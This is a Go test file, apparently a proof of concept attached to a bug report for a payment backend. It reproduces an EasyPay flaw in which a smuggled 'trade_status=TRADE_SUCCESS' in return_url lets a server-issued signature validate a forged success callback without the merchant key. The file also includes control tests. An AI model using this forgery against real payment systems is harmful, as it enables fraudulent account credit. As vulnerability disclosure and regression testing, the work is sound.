// PoC for issue #7881 — EasyPay signature reuse via return_url parameter smuggling.
//
// Drop-in test: copy to backend/internal/payment/provider/ and run
//   go test ./internal/payment/provider/ -run TestSmuggle -v
//
// It drives the REAL code path of backend/internal/payment/provider/easypay.go:
//   CreatePayment (popup/submit.php) -> pay URL carrying `sign`
//   VerifyNotification             -> signature recomputed from parsed params
//
// The attacker never knows pkey. The only thing they need is a signature that
// the server itself produced over a byte-string they shaped via return_url.
package provider

import (
	"context"
	"net/url"
	"sort"
	"strings"
	"testing"

	"github.com/Wei-Shaw/sub2api/internal/payment"
)

const (
	pocPKey    = "SUPER_SECRET_MERCHANT_KEY_NOT_KNOWN_TO_ATTACKER"
	pocOrderNo = "sub2_ATTACKER_ORDER_0001"
	pocAmount  = "650.00"
	pocHost    = "site.example.com"
)

func pocEasyPay(t *testing.T) *EasyPay {
	t.Helper()
	e, err := NewEasyPay("poc-instance", map[string]string{
		"pid":         "1000",
		"pkey":        pocPKey,
		"apiBase":     "https://pay.example.com",
		"notifyUrl":   "https://" + pocHost + "/api/v1/payment/webhook/easypay",
		"returnUrl":   "https://" + pocHost + "/payment/result",
		"paymentMode": paymentModePopup, // submit.php => sign is exposed to the payer
	})
	if err != nil {
		t.Fatalf("NewEasyPay: %v", err)
	}
	return e
}

// Step 1: attacker submits a return_url whose query carries the smuggled
// field. CanonicalizeReturnURL() only validates scheme/host/path and leaves
// RawQuery intact (see internal/service/payment_resume_service.go:235).
const pocReturnURLPrefix = "https://" + pocHost + "/payment/result"

func TestSmuggleCreateSignatureIntoForgedCallback(t *testing.T) {
	e := pocEasyPay(t)
	ctx := context.Background()

	// ---- ATTACKER: create their own order, poison return_url -----------------
	// The injection must survive the service layer's re-encode, so the value the
	// provider actually signs is the rebuilt one, not the raw injection.
	maliciousReturnURL := pocProviderReturnURL(t, 99, pocOrderNo, "RESUME_TOKEN")

	resp, err := e.CreatePayment(ctx, payment.CreatePaymentRequest{
		OrderID:     pocOrderNo,
		Amount:      pocAmount,
		PaymentType: "alipay",
		Subject:     "balance recharge",
		NotifyURL:   "https://" + pocHost + "/api/v1/payment/webhook/easypay",
		ReturnURL:   maliciousReturnURL,
		ClientIP:    "203.0.113.7",
	})
	if err != nil {
		t.Fatalf("CreatePayment: %v", err)
	}

	// ---- The pay URL handed back to the attacker carries the live signature --
	parsedPay, err := url.Parse(resp.PayURL)
	if err != nil {
		t.Fatalf("parse pay url: %v", err)
	}
	q := parsedPay.Query()
	sign := q.Get("sign")
	if sign == "" {
		t.Fatal("no sign in pay url")
	}
	signedReturnURL := q.Get("return_url") // url-decoded by ParseQuery
	t.Logf("pay url   : %s", resp.PayURL)
	t.Logf("sign      : %s  (server-computed with pkey, attacker does NOT know pkey)", sign)
	t.Logf("signed return_url: %s", signedReturnURL)

	// Byte-explanation of the two base strings.
	t.Logf("create  base string: %s%s", easyPayBaseString(q), "<pkey>")

	// ---- ATTACKER: forge the callback. return_url truncated before the
	// smuggled pair, which is re-injected as a genuine top-level parameter.
	// The separator is '?' when the provider sees the raw injection and '&'
	// after the service layer re-encoded the query (see TestSmuggleServerReorder).
	pair := "trade_status=TRADE_SUCCESS"
	idx := strings.LastIndex(signedReturnURL, pair)
	if idx <= 0 {
		t.Fatalf("smuggled pair not found in signed return_url: %s", signedReturnURL)
	}
	sep := signedReturnURL[idx-1]
	if sep != '?' && sep != '&' {
		t.Fatalf("unexpected separator %q before smuggled pair", sep)
	}
	prefix := signedReturnURL[:idx-1]

	cb := url.Values{}
	for k, vs := range q {
		if k == "sign" || k == "sign_type" {
			continue
		}
		v := vs[0]
		if k == "return_url" {
			v = prefix
		}
		cb.Set(k, v)
	}
	// EasyPay's own async notify also carries trade_no; omitting it here only
	// shrinks the param set, it does not need to be guessed.
	rawCallback := cb.Encode() + "&trade_status=TRADE_SUCCESS" + "&sign=" + sign + "&sign_type=MD5"
	t.Logf("forged callback body: %s", rawCallback)
	t.Logf("verify  base string: %s%s", easyPayBaseString(mustParseQuery(t, rawCallback)), "<pkey>")

	// ---- VULNERABLE SINK ---------------------------------------------------
	n, err := e.VerifyNotification(ctx, rawCallback, nil)
	if err != nil {
		t.Fatalf("VULNERABLE PATH NOT REPRODUCED — VerifyNotification rejected it: %v", err)
	}
	t.Logf("ACCEPTED: order=%s trade_no=%q status=%s amount=%.2f",
		n.OrderID, n.TradeNo, n.Status, n.Amount)

	if n.Status != payment.NotificationStatusSuccess {
		t.Fatalf("status = %q, want success", n.Status)
	}
	if n.OrderID != pocOrderNo {
		t.Fatalf("order = %q, want %q", n.OrderID, pocOrderNo)
	}
	if n.Amount != 650.00 {
		t.Fatalf("amount = %v, want 650", n.Amount)
	}
	t.Log("BUG REPRODUCED: forged callback accepted, no merchant key required")
}

// Control: the identical forgery with an ordinary return_url (no injection) must
// fail, proving the acceptance above is caused by the smuggling and not by
// VerifyNotification skipping fields.
func TestSmuggleNegativeControl(t *testing.T) {
	e := pocEasyPay(t)
	ctx := context.Background()

	resp, err := e.CreatePayment(ctx, payment.CreatePaymentRequest{
		OrderID: pocOrderNo, Amount: pocAmount, PaymentType: "alipay",
		Subject: "balance recharge", NotifyURL: "https://" + pocHost + "/api/v1/payment/webhook/easypay",
		ReturnURL: pocReturnURLPrefix, // clean
		ClientIP:  "203.0.113.7",
	})
	if err != nil {
		t.Fatalf("CreatePayment: %v", err)
	}
	q, _ := url.Parse(resp.PayURL)
	q2 := q.Query()
	cb := url.Values{}
	for k, vs := range q2 {
		if k == "sign" || k == "sign_type" {
			continue
		}
		cb.Set(k, vs[0])
	}
	raw := cb.Encode() + "&trade_status=TRADE_SUCCESS" + "&sign=" + q2.Get("sign") + "&sign_type=MD5"
	if _, err := e.VerifyNotification(ctx, raw, nil); err == nil {
		t.Fatal("negative control unexpectedly accepted")
	} else {
		t.Logf("negative control correctly rejected: %v", err)
	}
}

// Control: a real EasyPay notify (its own param set + its own signature) must
// still verify, so the PoC is not just "everything is accepted".
func TestSmuggleRealNotifyStillWorks(t *testing.T) {
	e := pocEasyPay(t)
	ctx := context.Background()

	real := map[string]string{
		"pid": "1000", "trade_no": "2026093012345678", "out_trade_no": pocOrderNo,
		"type": "alipay", "name": "balance recharge", "money": pocAmount,
		"trade_status": tradeStatusSuccess,
	}
	real["sign"] = easyPaySign(real, pocPKey)
	v := url.Values{}
	for k, s := range real {
		v.Set(k, s)
	}
	v.Set("sign_type", signTypeMD5)
	if _, err := e.VerifyNotification(ctx, v.Encode(), nil); err != nil {
		t.Fatalf("real notify rejected: %v", err)
	}
	t.Log("real notify verified OK")
}

// TestSmuggleServerReorder proves the service layer keeps the injected query and
// re-encodes it with the smuggled pair LAST, which is what places it immediately
// before the "&type=" that key sorting always emits next.
//
// It replays the exact stdlib calls of
//   CanonicalizeReturnURL  (payment_resume_service.go:235 — clears Fragment only)
//   buildPaymentReturnURL  (payment_resume_service.go:276 — Query() + Set + Encode())
// so the ordering claim is verified by the Go standard library, not by hand.
func TestSmuggleServerReorder(t *testing.T) {
	raw := pocReturnURLPrefix + "?trade_status=TRADE_SUCCESS"

	// CanonicalizeReturnURL
	parsed, err := url.Parse(raw)
	if err != nil || !parsed.IsAbs() || parsed.Host == "" {
		t.Fatalf("canonicalize: %v", err)
	}
	parsed.Fragment = ""
	if parsed.Path != "/payment/result" || parsed.Host != pocHost {
		t.Fatalf("canonicalize rejects: %s", parsed)
	}
	if parsed.RawQuery == "" {
		t.Fatal("query was stripped — issue is not reproducible on this version")
	}

	// buildPaymentReturnURL
	query := parsed.Query()
	query.Set("order_id", "99")
	query.Set("out_trade_no", pocOrderNo)
	query.Set("resume_token", "RESUME_TOKEN")
	query.Set("status", "success")
	parsed.RawQuery = query.Encode()
	providerReturn := parsed.String()
	t.Logf("provider return_url: %s", providerReturn)

	if !strings.HasSuffix(providerReturn, "&trade_status=TRADE_SUCCESS") {
		t.Fatalf("injected pair is not last; smuggle shape changed: %s", providerReturn)
	}
	t.Log("injected trade_status sorts last inside return_url -> smuggle shape holds")
}

// pocProviderReturnURL replays buildPaymentReturnURL (payment_resume_service.go:276)
// on top of the attacker's poisoned base, using the same stdlib calls.
func pocProviderReturnURL(t *testing.T, orderID int64, outTradeNo, resumeToken string) string {
	t.Helper()
	parsed, err := url.Parse(pocReturnURLPrefix + "?trade_status=TRADE_SUCCESS")
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	query := parsed.Query()
	query.Set("order_id", "99")
	query.Set("out_trade_no", outTradeNo)
	query.Set("resume_token", resumeToken)
	query.Set("status", "success")
	parsed.RawQuery = query.Encode()
	return parsed.String()
}

// ---- helpers: show the exact bytes that get MD5'd ---------------------------

func easyPayBaseString(values url.Values) string {
	params := map[string]string{}
	for k := range values {
		params[k] = values.Get(k)
	}
	keys := make([]string, 0, len(params))
	for k, val := range params {
		if k == "sign" || k == "sign_type" || val == "" {
			continue
		}
		keys = append(keys, k)
	}
	sort.Strings(keys)
	var sb strings.Builder
	for i, k := range keys {
		if i > 0 {
			sb.WriteByte('&')
		}
		sb.WriteString(k + "=" + params[k])
	}
	return sb.String()
}

func mustParseQuery(t *testing.T, raw string) url.Values {
	t.Helper()
	v, err := url.ParseQuery(raw)
	if err != nil {
		t.Fatalf("ParseQuery: %v", err)
	}
	return v
}